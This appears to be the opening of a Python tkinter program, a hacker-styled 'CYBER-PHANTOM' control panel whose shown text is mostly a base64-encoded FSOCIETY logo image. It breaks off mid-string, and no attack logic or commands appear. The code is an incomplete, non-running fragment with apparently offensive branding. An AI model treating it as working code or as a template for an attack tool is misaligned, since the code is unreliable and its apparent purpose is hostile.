import tkinter as tk
from tkinter import messagebox
import requests
import threading
import time
import base64
from io import BytesIO
from PIL import Image, ImageTk

class CyberPhantom:
    def __init__(self, master):
        self.master = master
        # NOME DO PAINEL ATUALIZADO
        master.title("CYBER-PHANTOM - PAINEL DE CONTROLE")
        master.geometry("500x720")
        master.configure(bg="#0a0a0a")

        # --- IMAGEM FSOCIETY (Logo Máscara) ---
        try:
            # Dados da imagem FSOCIETY em Base64
            img_data = "data:image/jpeg;base64,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